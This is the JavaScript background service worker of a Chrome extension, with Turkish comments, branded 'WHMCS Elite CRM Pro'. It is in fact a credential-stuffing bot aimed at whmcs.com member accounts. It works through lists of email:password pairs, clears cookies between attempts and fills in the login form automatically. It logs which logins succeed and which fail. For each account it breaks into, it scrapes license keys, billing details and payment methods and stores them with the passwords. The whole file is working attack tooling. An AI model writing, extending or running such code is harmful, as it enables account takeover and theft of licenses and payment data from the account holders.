// WHMCS Elite CRM Pro - Background Service Worker v3.1
// Gelişmiş Özellikler: Sekme Yönetimi, Tekrar Başlatma, Zaten Giriş Yapmış Hesapları Atla

const CONFIG = {
    URLS: {
        LOGIN: "https://www.whmcs.com/members/index.php?rp=/login",
        SERVICES: "https://www.whmcs.com/members/clientarea.php?action=services",
        PAYMENTS: "https://www.whmcs.com/members/index.php?rp=/account/paymentmethods"
    },
    DEFAULT_DELAY: 6000
};

// Bot State
let botState = {
    running: false,
    paused: false,
    queue: [],
    currentIndex: 0,
    currentTab: null,
    settings: { delay: CONFIG.DEFAULT_DELAY },
    results: {
        successful: [],
        failed: [],
        skipped: []
    },
    startTime: null,
    processedCount: 0,
    tabCheckInterval: null
};

// Initialize
chrome.runtime.onInstalled.addListener(() => {
    console.log('[WHMCS Elite] Extension installed v3.1');
    chrome.storage.local.set({
        accounts: {},
        successfulLogins: [],
        failedLogins: [],
        botLogs: [],
        settings: { delay: CONFIG.DEFAULT_DELAY }
    });
});

// Message Handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    (async () => {
        try {
            switch (msg.type) {
                case 'START_BOT':
                    await startBot(msg.accounts, msg.delay, msg.skipExisting);
                    sendResponse({ success: true });
                    break;
                case 'STOP_BOT':
                    await stopBot();
                    sendResponse({ success: true });
                    break;
                case 'PAUSE_BOT':
                    await pauseBot();
                    sendResponse({ success: true });
                    break;
                case 'RESUME_BOT':
                    await resumeBot();
                    sendResponse({ success: true });
                    break;
                case 'RESTART_BOT':
                    await restartBot();
                    sendResponse({ success: true });
                    break;
                case 'SINGLE_LOGIN':
                    await singleLogin(msg.email, msg.password);
                    sendResponse({ success: true });
                    break;
                case 'GET_BOT_STATUS':
                    sendResponse({
                        success: true,
                        status: {
                            running: botState.running,
                            paused: botState.paused,
                            current: botState.currentIndex,
                            total: botState.queue.length,
                            skipped: botState.results.skipped.length
                        }
                    });
                    break;
                default:
                    sendResponse({ success: false, error: 'Unknown message type' });
            }
        } catch (error) {
            console.error('[WHMCS Elite] Error:', error);
            sendResponse({ success: false, error: error.message });
        }
    })();
    return true;
});

// Check if tab exists
async function tabExists(tabId) {
    try {
        const tab = await chrome.tabs.get(tabId);
        return tab && !tab.discarded;
    } catch (e) {
        return false;
    }
}

// Create or get bot tab
async function ensureBotTab() {
    // Check if current tab exists
    if (botState.currentTab && await tabExists(botState.currentTab)) {
        return botState.currentTab;
    }

    // Create new tab
    log('🔄 Sekme kapatılmış, yeni sekme açılıyor...');
    const tab = await chrome.tabs.create({
        url: CONFIG.URLS.LOGIN,
        active: false
    });
    botState.currentTab = tab.id;

    // Start tab monitoring
    startTabMonitoring();

    return tab.id;
}

// Monitor tab status
function startTabMonitoring() {
    if (botState.tabCheckInterval) {
        clearInterval(botState.tabCheckInterval);
    }

    botState.tabCheckInterval = setInterval(async () => {
        if (!botState.running || botState.paused) return;

        const exists = await tabExists(botState.currentTab);
        if (!exists) {
            log('⚠️ İşlem sekmesi kapatıldı, yeniden oluşturuluyor...');
            await ensureBotTab();
        }
    }, 3000);
}

// Stop tab monitoring
function stopTabMonitoring() {
    if (botState.tabCheckInterval) {
        clearInterval(botState.tabCheckInterval);
        botState.tabCheckInterval = null;
    }
}

// Check if account already exists and successful
async function isAccountAlreadyProcessed(email) {
    const { successfulLogins, accounts } = await chrome.storage.local.get(['successfulLogins', 'accounts']);

    // Check successful logins list
    const inSuccessList = successfulLogins?.some(l => l.email.toLowerCase() === email.toLowerCase());

    // Check accounts object
    const inAccounts = accounts && accounts[email.toLowerCase()];

    return inSuccessList || inAccounts;
}

// Start Bot
async function startBot(accounts, delay = CONFIG.DEFAULT_DELAY, skipExisting = true) {
    if (botState.running) {
        log('⚠️ Bot zaten çalışıyor!');
        return;
    }

    botState.running = true;
    botState.paused = false;
    botState.queue = accounts || [];
    botState.currentIndex = 0;
    botState.settings.delay = delay;
    botState.results = { successful: [], failed: [], skipped: [] };
    botState.startTime = Date.now();
    botState.processedCount = 0;

    // Filter out already processed accounts if skipExisting is true
    if (skipExisting) {
        const filteredQueue = [];
        const skippedAccounts = [];

        for (const accountStr of botState.queue) {
            const email = accountStr.split(':')[0]?.trim();
            if (email && await isAccountAlreadyProcessed(email)) {
                skippedAccounts.push(email);
            } else {
                filteredQueue.push(accountStr);
            }
        }

        if (skippedAccounts.length > 0) {
            log(`⏭️ ${skippedAccounts.length} hesap zaten işlenmiş, atlanıyor...`);
            botState.results.skipped = skippedAccounts;
        }

        botState.queue = filteredQueue;
    }

    if (botState.queue.length === 0) {
        log('✅ Tüm hesaplar zaten işlenmiş!');
        botState.running = false;
        broadcastStatus('BOT_FINISHED', {
            total: 0,
            successful: 0,
            failed: 0,
            skipped: botState.results.skipped.length
        });
        return;
    }

    log(`🚀 Bot başlatıldı! ${botState.queue.length} hesap işlenecek.`);

    // Create initial tab
    await ensureBotTab();

    // Start tab monitoring
    startTabMonitoring();

    await processNext();
}

// Stop Bot
async function stopBot() {
    botState.running = false;
    botState.paused = false;
    botState.startTime = null;
    stopTabMonitoring();
    log('🛑 Bot durduruldu.');
    broadcastStatus('BOT_STOPPED');
}

// Pause Bot
async function pauseBot() {
    botState.paused = true;
    log('⏸️ Bot duraklatıldı.');
    broadcastStatus('BOT_PAUSED');
}

// Resume Bot
async function resumeBot() {
    if (!botState.running) return;
    botState.paused = false;
    log('▶️ Bot devam ediyor...');
    broadcastStatus('BOT_RESUMED');

    // Ensure tab exists before resuming
    await ensureBotTab();

    await processNext();
}

// Restart Bot
async function restartBot() {
    log('🔄 Bot yeniden başlatılıyor...');

    // Stop current bot
    botState.running = false;
    botState.paused = false;
    stopTabMonitoring();

    // Small delay to ensure clean state
    await wait(1000);

    // Reset state but keep queue
    const originalQueue = [...botState.queue];
    botState.currentIndex = 0;
    botState.results = { successful: [], failed: [], skipped: [] };
    botState.startTime = Date.now();
    botState.processedCount = 0;

    // Start fresh
    botState.running = true;
    botState.queue = originalQueue;

    log(`🚀 Bot yeniden başlatıldı! ${botState.queue.length} hesap işlenecek.`);

    // Create new tab
    await ensureBotTab();
    startTabMonitoring();

    await processNext();
}

// Process Next Account
async function processNext() {
    if (!botState.running) {
        await finishBot();
        return;
    }

    if (botState.paused) return;

    if (botState.currentIndex >= botState.queue.length) {
        await finishBot();
        return;
    }

    const accountStr = botState.queue[botState.currentIndex];
    let email, password;

    if (typeof accountStr === 'string' && accountStr.includes(':')) {
        const parts = accountStr.split(':');
        email = parts[0].trim();
        password = parts.slice(1).join(':').trim();
    } else {
        log(`❌ Geçersiz hesap formatı`);
        botState.currentIndex++;
        await processNext();
        return;
    }

    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Giriş Yapılıyor...'
    });

    log(`🔐 İşleniyor: ${email}`);

    try {
        await processAccount(email, password);
    } catch (error) {
        log(`❌ Hata: ${email} - ${error.message}`);

        // If tab error, try to recover
        if (error.message && error.message.includes('No tab with id')) {
            log('🔄 Sekme hatası, yeniden deneniyor...');
            await ensureBotTab();
            // Retry same account
            setTimeout(() => processNext(), 2000);
            return;
        }

        await saveFailedLogin(email, password, error.message);
    }

    botState.currentIndex++;
    botState.processedCount++;

    if (botState.running && !botState.paused) {
        setTimeout(() => processNext(), botState.settings.delay);
    }
}

// Process Single Account
async function processAccount(email, password) {
    // Ensure tab exists
    const tabId = await ensureBotTab();

    // Set current account
    await chrome.storage.local.set({ current_bot_account: email });

    // Clear cookies
    await clearCookies('whmcs.com');
    await clearCookies('.whmcs.com');

    // Login sayfasına git
    log(`🌐 Login sayfasına gidiliyor...`);
    await chrome.tabs.update(tabId, { url: CONFIG.URLS.LOGIN });
    await wait(5000);

    if (!botState.running || botState.paused) return;

    // Login form doldur
    log(`📝 Login form dolduruluyor...`);
    const loginResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: fillLoginForm,
        args: [email, password]
    });

    if (!loginResult[0].result.success) {
        throw new Error('Login form doldurulamadı');
    }

    // Giriş bekle
    log(`⏳ Giriş bekleniyor...`);
    await wait(6000);

    if (!botState.running || botState.paused) return;

    // Giriş kontrolü
    const verifyResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: verifyLogin
    });

    const verifyData = verifyResult[0].result;

    if (!verifyData.success) {
        log(`❌ Giriş Başarısız: ${email}`);
        await saveFailedLogin(email, password, verifyData.error || 'Giriş başarısız');
        broadcastStatus('STATUS_UPDATE', {
            total: botState.queue.length,
            current: botState.currentIndex + 1,
            email: email,
            step: 'Giriş Başarısız'
        });
        return;
    }

    // Giriş başarılı!
    log(`✅ Giriş Başarılı: ${email}`);

    const accountData = {
        email,
        password,
        loginTime: new Date().toISOString(),
        licenses: [],
        payments: []
    };

    // ===== SERVİSLER SAYFASINA GİT =====
    log(`🌐 Servisler sayfasına gidiliyor...`);
    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Lisanslar Çekiliyor...'
    });

    await chrome.tabs.update(tabId, { url: CONFIG.URLS.SERVICES });
    await wait(8000);

    if (!botState.running || botState.paused) return;

    // Lisansları çek
    const licensesResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: scrapeLicensesAdvanced
    });

    if (licensesResult[0].result) {
        accountData.licenses = licensesResult[0].result;
        log(`📋 ${accountData.licenses.length} lisans bulundu`);

        if (accountData.licenses.length > 0) {
            broadcastStatus('LICENSE_FOUND', { count: accountData.licenses.length });
        }
    }

    // ===== ÖDEME YÖNTEMLERİ SAYFASINA GİT =====
    log(`🌐 Ödeme yöntemleri sayfasına gidiliyor...`);
    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Ödemeler Çekiliyor...'
    });

    await chrome.tabs.update(tabId, { url: CONFIG.URLS.PAYMENTS });
    await wait(8000);

    if (!botState.running || botState.paused) return;

    // Ödeme yöntemlerini çek
    const paymentsResult = await chrome.scripting.executeScript({
        target: { tabId },
        func: scrapePaymentsAdvanced
    });

    if (paymentsResult[0].result) {
        accountData.payments = paymentsResult[0].result;
        log(`💳 ${accountData.payments.length} ödeme yöntemi bulundu`);
    }

    // Başarılı girişi kaydet
    await saveSuccessfulLogin(accountData);

    broadcastStatus('STATUS_UPDATE', {
        total: botState.queue.length,
        current: botState.currentIndex + 1,
        email: email,
        step: 'Tamamlandı'
    });
}

// Login form doldurma
function fillLoginForm(email, password) {
    try {
        const emailInput = document.getElementById('inputEmail') ||
                          document.querySelector('input[name="username"]') ||
                          document.querySelector('input[type="email"]');

        const passInput = document.getElementById('inputPassword') ||
                         document.querySelector('input[name="password"]') ||
                         document.querySelector('input[type="password"]');

        if (!emailInput || !passInput) {
            return { success: false, error: 'Form elements not found' };
        }

        emailInput.value = email;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        emailInput.dispatchEvent(new Event('change', { bubbles: true }));

        passInput.value = password;
        passInput.dispatchEvent(new Event('input', { bubbles: true }));
        passInput.dispatchEvent(new Event('change', { bubbles: true }));

        const submitBtn = document.getElementById('login') ||
                         document.querySelector('input[type="submit"]') ||
                         document.querySelector('button[type="submit"]');

        if (submitBtn) {
            submitBtn.click();
            return { success: true };
        }

        const form = emailInput.closest('form');
        if (form) {
            form.submit();
            return { success: true };
        }

        return { success: false, error: 'No submit method' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Login doğrulama
function verifyLogin() {
    try {
        const errorSelectors = ['.alert-danger', '.alert-error', '.text-danger', '.error'];
        for (const selector of errorSelectors) {
            const el = document.querySelector(selector);
            if (el && el.innerText.trim()) {
                const text = el.innerText.toLowerCase();
                if (text.includes('invalid') || text.includes('incorrect') || text.includes('error') ||
                    text.includes('wrong') || text.includes('failed')) {
                    return { success: false, error: el.innerText.trim() };
                }
            }
        }

        const logoutLink = document.querySelector('a[href*="logout"]');
        if (logoutLink) return { success: true };

        const userMenu = document.querySelector('.user-menu, .account-menu');
        if (userMenu) return { success: true };

        const loginForm = document.querySelector('form[action*="login"]');
        const emailInput = document.getElementById('inputEmail');

        if (!loginForm && !emailInput) {
            return { success: true };
        }

        return { success: false, error: 'Still on login page' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Gelişmiş lisans çekme
function scrapeLicensesAdvanced() {
    const licenses = [];

    const tableSelectors = [
        '#tableServicesList',
        '#servicesTable',
        '.table-services',
        'table.table',
        'table'
    ];

    let table = null;
    for (const selector of tableSelectors) {
        try {
            const el = document.querySelector(selector);
            if (el && el.querySelectorAll('tr').length > 1) {
                const text = el.innerText.toLowerCase();
                if (text.includes('product') || text.includes('service') || text.includes('status')) {
                    table = el;
                    break;
                }
            }
        } catch (e) {}
    }

    if (!table) return licenses;

    const rows = table.querySelectorAll('tbody tr, tr');

    rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        if (cells.length < 3) return;

        try {
            let product = '';
            let licenseKey = '';
            let billingCycle = '';
            let dueDate = '';
            let status = '';
            let price = '';
            let isActive = false;

            // Ürün adı
            const productSelectors = ['strong', 'a', 'h4', 'h3'];
            for (const sel of productSelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    const text = el.innerText.trim();
                    if (text && text.length > 2 && text.toLowerCase() !== 'product') {
                        product = text;
                        break;
                    }
                }
            }

            if (!product && cells.length > 1) {
                for (let i = 0; i < Math.min(cells.length, 3); i++) {
                    const text = cells[i].innerText.trim();
                    if (text && text.length > 2 && !text.includes('$')) {
                        product = text.split('\n')[0];
                        break;
                    }
                }
            }

            // Lisans key
            const keySelectors = ['a[href*="license"]', 'code', 'pre'];
            for (const sel of keySelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    const text = el.innerText.trim();
                    if (text && (text.includes('-') || text.length > 8)) {
                        licenseKey = text;
                        break;
                    }
                }
            }

            if (!licenseKey) {
                const rowText = row.innerText;
                const patterns = [
                    /WHMCS-[A-Z0-9]+/i,
                    /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/i,
                    /License[\s:]*([A-Z0-9-]+)/i
                ];

                for (const pattern of patterns) {
                    const match = rowText.match(pattern);
                    if (match) {
                        licenseKey = match[1] || match[0];
                        break;
                    }
                }
            }

            // Fiyat
            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText;
                if (text.match(/[\$€£\d]/)) {
                    price = text.split('\n')[0].trim();
                    break;
                }
            }

            // Fatura döngüsü
            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText.toLowerCase();
                if (text.includes('monthly')) { billingCycle = 'Aylık'; break; }
                if (text.includes('yearly')) { billingCycle = 'Yıllık'; break; }
                if (text.includes('one time')) { billingCycle = 'Tek Seferlik'; break; }
            }

            // Son tarih
            for (let i = 0; i < cells.length; i++) {
                const text = cells[i].innerText;
                if (text.match(/\d{2}[\/\-\.]\d{2}[\/\-\.]\d{4}/)) {
                    dueDate = text.split('\n')[0].trim();
                    break;
                }
            }

            // Durum
            const statusSelectors = ['.label', '.badge', '.status', 'td:last-child'];
            for (const sel of statusSelectors) {
                const el = row.querySelector(sel);
                if (el) {
                    status = el.innerText.trim();
                    break;
                }
            }

            // Durum Türkçeleştirme
            let statusTR = status;
            const statusLower = status.toLowerCase();

            if (statusLower.includes('active')) {
                statusTR = 'Aktif';
                isActive = true;
            } else if (statusLower.includes('suspended')) {
                statusTR = 'Askıya Alındı';
            } else if (statusLower.includes('terminated')) {
                statusTR = 'Sonlandırıldı';
            } else if (statusLower.includes('cancelled')) {
                statusTR = 'İptal Edildi';
            } else if (statusLower.includes('pending')) {
                statusTR = 'Beklemede';
            }

            if (product && product.length > 2 && product.toLowerCase() !== 'product') {
                licenses.push({
                    product,
                    licenseKey: licenseKey || '',
                    price: price || '',
                    billingCycle: billingCycle || '',
                    dueDate: dueDate || '',
                    status: statusTR,
                    statusEN: status,
                    isActive
                });
            }
        } catch (e) {}
    });

    return licenses;
}

// Gelişmiş ödeme çekme
function scrapePaymentsAdvanced() {
    const payments = [];

    const tableSelectors = ['#payMethodList', '.table-payment-methods', 'table'];
    let table = null;

    for (const selector of tableSelectors) {
        try {
            const el = document.querySelector(selector);
            if (el && el.innerText.toLowerCase().includes('payment')) {
                table = el;
                break;
            }
        } catch (e) {}
    }

    if (!table) return payments;

    const rows = table.querySelectorAll('tbody tr, tr');

    rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        if (cells.length < 3) return;

        try {
            let methodName = '';
            let description = '';
            let status = '';
            let isDefault = false;
            let isActive = false;

            const nameEl = cells[1]?.querySelector('strong, b');
            if (nameEl) methodName = nameEl.innerText.trim();

            const descEl = cells[2];
            if (descEl) description = descEl.innerText.trim();

            const statusEl = row.querySelector('.label, .badge');
            if (statusEl) status = statusEl.innerText.trim();

            if (row.innerText.toLowerCase().includes('default')) {
                isDefault = true;
            }

            let statusTR = status;
            if (status.toLowerCase().includes('active')) {
                statusTR = 'Aktif';
                isActive = true;
            } else if (status.toLowerCase().includes('inactive')) {
                statusTR = 'Pasif';
            }

            if (methodName && methodName.toLowerCase() !== 'name') {
                payments.push({
                    methodName,
                    description,
                    status: statusTR,
                    statusEN: status,
                    isDefault,
                    isActive
                });
            }
        } catch (e) {}
    });

    return payments;
}

// Başarılı giriş kaydet
async function saveSuccessfulLogin(accountData) {
    const { accounts, successfulLogins } = await chrome.storage.local.get(['accounts', 'successfulLogins']);

    const acc = accounts || {};
    const successList = successfulLogins || [];

    acc[accountData.email] = {
        email: accountData.email,
        password: accountData.password,
        loginTime: accountData.loginTime,
        lastStatus: 'Success',
        licenses: accountData.licenses || [],
        payments: accountData.payments || []
    };

    const existingIndex = successList.findIndex(l => l.email === accountData.email);
    const newEntry = {
        email: accountData.email,
        password: accountData.password,
        loginTime: accountData.loginTime,
        licenseCount: (accountData.licenses || []).length,
        paymentCount: (accountData.payments || []).length
    };

    if (existingIndex >= 0) {
        successList[existingIndex] = newEntry;
    } else {
        successList.push(newEntry);
    }

    await chrome.storage.local.set({
        accounts: acc,
        successfulLogins: successList
    });

    botState.results.successful.push(accountData);
    log(`✅ Kaydedildi: ${accountData.email}`);
}

// Başarısız giriş kaydet
async function saveFailedLogin(email, password, error) {
    const { failedLogins } = await chrome.storage.local.get(['failedLogins']);
    const failList = failedLogins || [];

    const existingIndex = failList.findIndex(l => l.email === email);
    const newEntry = {
        email,
        password,
        error,
        time: new Date().toISOString()
    };

    if (existingIndex >= 0) {
        failList[existingIndex] = newEntry;
    } else {
        failList.push(newEntry);
    }

    await chrome.storage.local.set({ failedLogins: failList });
    botState.results.failed.push({ email, password, error });
}

// Single Login
async function singleLogin(email, password) {
    const tab = await chrome.tabs.create({
        url: CONFIG.URLS.LOGIN,
        active: true
    });

    await wait(3000);

    await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: fillLoginForm,
        args: [email, password]
    });
}

// Finish Bot
async function finishBot() {
    botState.running = false;
    botState.paused = false;
    botState.startTime = null;
    stopTabMonitoring();

    log('✅ Tüm hesaplar işlendi!');
    log(`📊 Sonuç: ${botState.results.successful.length} başarılı, ${botState.results.failed.length} başarısız, ${botState.results.skipped.length} atlanmış`);

    broadcastStatus('BOT_FINISHED', {
        total: botState.queue.length,
        successful: botState.results.successful.length,
        failed: botState.results.failed.length,
        skipped: botState.results.skipped.length
    });

    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: 'WHMCS Elite CRM Pro',
        message: `Tamamlandı! ${botState.results.successful.length} başarılı, ${botState.results.failed.length} başarısız.`
    });
}

// Helper Functions
function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function clearCookies(domain) {
    return new Promise(resolve => {
        try {
            chrome.cookies.getAll({ domain }, (cookies) => {
                if (!cookies || cookies.length === 0) {
                    resolve();
                    return;
                }
                let count = cookies.length;
                cookies.forEach((cookie) => {
                    const url = "https://" + cookie.domain.replace(/^\./, "") + cookie.path;
                    chrome.cookies.remove({ url, name: cookie.name }, () => {
                        count--;
                        if (count <= 0) resolve();
                    });
                });
            });
        } catch (e) { resolve(); }
    });
}

function log(message) {
    console.log(`[WHMCS Elite] ${message}`);
    chrome.storage.local.get(['botLogs'], (res) => {
        const logs = res.botLogs || [];
        logs.push({ time: new Date().toISOString(), message });
        if (logs.length > 1000) logs.shift();
        chrome.storage.local.set({ botLogs: logs });
    });
    broadcastStatus('LOG', { message });
}

function broadcastStatus(type, data = {}) {
    chrome.runtime.sendMessage({ type, ...data }).catch(() => {});
}
